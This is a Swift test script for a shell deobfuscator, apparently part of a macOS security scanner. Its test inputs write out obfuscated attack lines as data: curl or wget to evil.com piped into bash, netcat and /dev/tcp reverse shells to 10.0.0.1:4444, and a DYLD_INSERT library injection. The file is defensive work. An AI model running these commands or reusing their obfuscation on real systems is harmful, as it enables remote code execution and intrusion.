#!/usr/bin/env swift
// Standalone test for ShellDeobfuscator — copies the type inline to test without Xcode.
// Usage: swift scripts/test-deobfuscator.swift

import Foundation

// Minimal Evidence stub matching the real type
struct Evidence: CustomStringConvertible {
    let factor: String
    let weight: Double
    enum Category { case content }
    let category: Category
    var description: String { "[\(String(format: "%.1f", weight))] \(factor)" }
}

// --- Paste of ShellDeobfuscator (keep in sync with source) ---

enum ShellDeobfuscator {
    struct Result {
        let decoded: String
        let evidence: [Evidence]
    }

    static func deobfuscate(_ content: String) -> Result {
        var ev: [Evidence] = []
        var text = content
        let (t1, e1) = decodeIFS(text); text = t1; ev.append(contentsOf: e1)
        let (t2, e2) = decodeHexEscapes(text); text = t2; ev.append(contentsOf: e2)
        let (t3, e3) = decodeOctalEscapes(text); text = t3; ev.append(contentsOf: e3)
        let (t4, e4) = decodePrintfHex(text); text = t4; ev.append(contentsOf: e4)
        let (t5, e5) = decodeQuoteSplitting(text); text = t5; ev.append(contentsOf: e5)
        ev.append(contentsOf: detectVariableSubstitution(content))
        ev.append(contentsOf: detectBacktickExec(content))
        return Result(decoded: text, evidence: ev)
    }

    static func decodeIFS(_ text: String) -> (String, [Evidence]) {
        let pattern = "${IFS}"
        guard text.contains(pattern) else { return (text, []) }
        let count = text.components(separatedBy: pattern).count - 1
        let decoded = text.replacingOccurrences(of: pattern, with: " ")
        return (decoded, [Evidence(factor: "${IFS} substitution (\(count)x)", weight: 0.5, category: .content)])
    }

    static func decodeHexEscapes(_ text: String) -> (String, [Evidence]) {
        guard let regex = try? NSRegularExpression(pattern: #"\$'((?:[^'\\]|\\x[0-9a-fA-F]{2}|\\.)*)'"#)
        else { return (text, []) }
        var decoded = text
        let range = NSRange(text.startIndex..., in: text)
        let matches = regex.matches(in: text, range: range)
        guard !matches.isEmpty else { return (text, []) }
        var hexCount = 0
        for match in matches.reversed() {
            guard let innerRange = Range(match.range(at: 1), in: decoded) else { continue }
            let inner = String(decoded[innerRange])
            guard inner.contains("\\x") else { continue }
            let expanded = expandHexEscapes(inner)
            hexCount += inner.components(separatedBy: "\\x").count - 1
            let fullRange = Range(match.range, in: decoded)!
            decoded.replaceSubrange(fullRange, with: expanded)
        }
        guard hexCount > 0 else { return (text, []) }
        return (decoded, [Evidence(factor: "Hex-escaped $'\\xNN' (\(hexCount) bytes)", weight: 0.6, category: .content)])
    }

    static func expandHexEscapes(_ s: String) -> String {
        var result = ""
        var i = s.startIndex
        while i < s.endIndex {
            if s[i] == "\\" && s.index(after: i) < s.endIndex {
                let next = s.index(after: i)
                if s[next] == "x" {
                    let hexStart = s.index(next, offsetBy: 1, limitedBy: s.endIndex) ?? s.endIndex
                    let hexEnd = s.index(hexStart, offsetBy: 2, limitedBy: s.endIndex) ?? s.endIndex
                    if hexEnd <= s.endIndex {
                        let hex = String(s[hexStart..<hexEnd])
                        if let byte = UInt8(hex, radix: 16) {
                            result.append(Character(UnicodeScalar(byte)))
                            i = hexEnd; continue
                        }
                    }
                }
            }
            result.append(s[i]); i = s.index(after: i)
        }
        return result
    }

    static func decodeOctalEscapes(_ text: String) -> (String, [Evidence]) {
        guard let regex = try? NSRegularExpression(pattern: #"\$'((?:[^'\\]|\\[0-7]{1,3}|\\.)*)'"#)
        else { return (text, []) }
        var decoded = text
        let range = NSRange(text.startIndex..., in: text)
        let matches = regex.matches(in: text, range: range)
        guard !matches.isEmpty else { return (text, []) }
        var octalCount = 0
        for match in matches.reversed() {
            guard let innerRange = Range(match.range(at: 1), in: decoded) else { continue }
            let inner = String(decoded[innerRange])
            guard inner.range(of: #"\\[0-7]{1,3}"#, options: .regularExpression) != nil else { continue }
            let expanded = expandOctalEscapes(inner)
            if expanded != inner { octalCount += 1; let fullRange = Range(match.range, in: decoded)!; decoded.replaceSubrange(fullRange, with: expanded) }
        }
        guard octalCount > 0 else { return (text, []) }
        return (decoded, [Evidence(factor: "Octal-escaped $'\\NNN'", weight: 0.6, category: .content)])
    }

    static func expandOctalEscapes(_ s: String) -> String {
        var result = ""
        var i = s.startIndex
        while i < s.endIndex {
            if s[i] == "\\" {
                let next = s.index(after: i)
                if next < s.endIndex && s[next] >= "0" && s[next] <= "7" {
                    var octal = ""
                    var j = next
                    while j < s.endIndex && octal.count < 3 && s[j] >= "0" && s[j] <= "7" {
                        octal.append(s[j]); j = s.index(after: j)
                    }
                    if let byte = UInt8(octal, radix: 8), byte < 128 {
                        result.append(Character(UnicodeScalar(byte))); i = j; continue
                    }
                }
            }
            result.append(s[i]); i = s.index(after: i)
        }
        return result
    }

    static func decodePrintfHex(_ text: String) -> (String, [Evidence]) {
        guard let regex = try? NSRegularExpression(pattern: #"\$\(printf\s+'((?:\\x[0-9a-fA-F]{2})+)'\)"#)
        else { return (text, []) }
        var decoded = text
        let range = NSRange(text.startIndex..., in: text)
        let matches = regex.matches(in: text, range: range)
        guard !matches.isEmpty else { return (text, []) }
        for match in matches.reversed() {
            guard let innerRange = Range(match.range(at: 1), in: decoded) else { continue }
            let inner = String(decoded[innerRange])
            let expanded = expandHexEscapes(inner)
            let fullRange = Range(match.range, in: decoded)!
            decoded.replaceSubrange(fullRange, with: expanded)
        }
        return (decoded, [Evidence(factor: "printf hex execution", weight: 0.7, category: .content)])
    }

    static func decodeQuoteSplitting(_ text: String) -> (String, [Evidence]) {
        let hasSingleSplit = text.contains("''") && !text.contains("'''")
        let hasDoubleSplit = text.contains("\"\"") && !text.contains("\"\"\"")
        guard hasSingleSplit || hasDoubleSplit else { return (text, []) }
        var decoded = text
        decoded = decoded.replacingOccurrences(of: "''", with: "")
        decoded = decoded.replacingOccurrences(of: "\"\"", with: "")
        guard decoded != text else { return (text, []) }
        return (decoded, [Evidence(factor: "Quote-split strings", weight: 0.3, category: .content)])
    }

    static func detectVariableSubstitution(_ text: String) -> [Evidence] {
        let lines = text.components(separatedBy: "\n")
        let cmds = ["curl", "wget", "nc", "bash", "sh", "python", "perl", "ruby"]
        for line in lines {
            let t = line.trimmingCharacters(in: .whitespaces)
            if t.hasPrefix("#") { continue }
            let lower = t.lowercased()
            for cmd in cmds {
                if lower.range(of: "[a-z_]+=[\"']?\(cmd)[\"']?\\s*$", options: .regularExpression) != nil ||
                   lower.range(of: "[a-z_]+=[\"']?\(cmd)[\"']?;", options: .regularExpression) != nil {
                    return [Evidence(factor: "Variable hides command name", weight: 0.4, category: .content)]
                }
            }
        }
        return []
    }

    static func detectBacktickExec(_ text: String) -> [Evidence] {
        let lines = text.components(separatedBy: "\n")
        for line in lines {
            let t = line.trimmingCharacters(in: .whitespaces)
            if t.hasPrefix("#") { continue }
            if let range = t.range(of: "`[^`]*(?:echo|printf)[^`]*`", options: .regularExpression) {
                let inside = String(t[range]).lowercased()
                if ["curl", "wget", "nc", "bash", "sh", "python"].contains(where: { inside.contains($0) }) {
                    return [Evidence(factor: "Backtick constructs command", weight: 0.5, category: .content)]
                }
            }
        }
        return []
    }
}

// --- Test runner ---

var passed = 0
var failed = 0

func test(_ name: String, input: String, expectDecoded: String? = nil, expectEvidence: [String]) {
    let r = ShellDeobfuscator.deobfuscate(input)
    var ok = true

    if let expected = expectDecoded {
        if !r.decoded.contains(expected) {
            print("FAIL \(name): decoded missing '\(expected)'")
            print("  got: \(r.decoded)")
            ok = false
        }
    }

    for expected in expectEvidence {
        if !r.evidence.contains(where: { $0.factor.contains(expected) }) {
            print("FAIL \(name): missing evidence '\(expected)'")
            print("  got: \(r.evidence.map(\.factor))")
            ok = false
        }
    }

    if expectEvidence.isEmpty && !r.evidence.isEmpty {
        print("FAIL \(name): expected clean but got evidence: \(r.evidence.map(\.factor))")
        ok = false
    }

    if ok {
        passed += 1
        print("PASS \(name)")
    } else {
        failed += 1
    }
}

// Tests

test("plain-no-obfuscation",
     input: "curl http://evil.com | bash\n",
     expectEvidence: [])

test("ifs-space-evasion",
     input: "curl${IFS}http://evil.com|bash\n",
     expectDecoded: "curl http://evil.com|bash",
     expectEvidence: ["${IFS} substitution"])

test("hex-curl",
     input: "$'\\x63\\x75\\x72\\x6c' http://evil.com | bash\n",
     expectDecoded: "curl",
     expectEvidence: ["Hex-escaped"])

test("octal-nc",
     input: "$'\\156\\143' -e /bin/sh 10.0.0.1 4444\n",
     expectDecoded: "nc",
     expectEvidence: ["Octal-escaped"])

test("printf-wget",
     input: "$(printf '\\x77\\x67\\x65\\x74') http://evil.com | sh\n",
     expectDecoded: "wget",
     expectEvidence: ["printf hex"])

test("quote-split-curl",
     input: "'cu''rl' http://evil.com | bash\n",
     expectDecoded: "curl",
     expectEvidence: ["Quote-split"])

test("variable-hiding",
     input: "c=curl\n$c http://evil.com | bash\n",
     expectEvidence: ["Variable hides"])

test("backtick-construction",
     input: "`echo curl` http://evil.com | bash\n",
     expectEvidence: ["Backtick constructs"])

test("ifs-reverse-shell",
     input: "bash${IFS}-i${IFS}>&${IFS}/dev/tcp/10.0.0.1/4444${IFS}0>&1\n",
     expectDecoded: "/dev/tcp/",
     expectEvidence: ["${IFS} substitution"])

test("clean-config",
     input: "export PATH=$HOME/bin:$PATH\nalias ll='ls -la'\n",
     expectEvidence: [])

test("hex-dyld-insert",
     input: "export $'\\x44\\x59\\x4c\\x44\\x5f\\x49\\x4e\\x53\\x45\\x52\\x54'=/tmp/evil.dylib\n",
     expectDecoded: "DYLD_INSERT",
     expectEvidence: ["Hex-escaped"])

test("combined-ifs-plus-hex",
     input: "$'\\x63\\x75\\x72\\x6c'${IFS}http://evil.com${IFS}|${IFS}bash\n",
     expectDecoded: "curl",
     expectEvidence: ["${IFS} substitution", "Hex-escaped"])

print("\n\(passed) passed, \(failed) failed out of \(passed + failed)")
if failed > 0 { exit(1) }
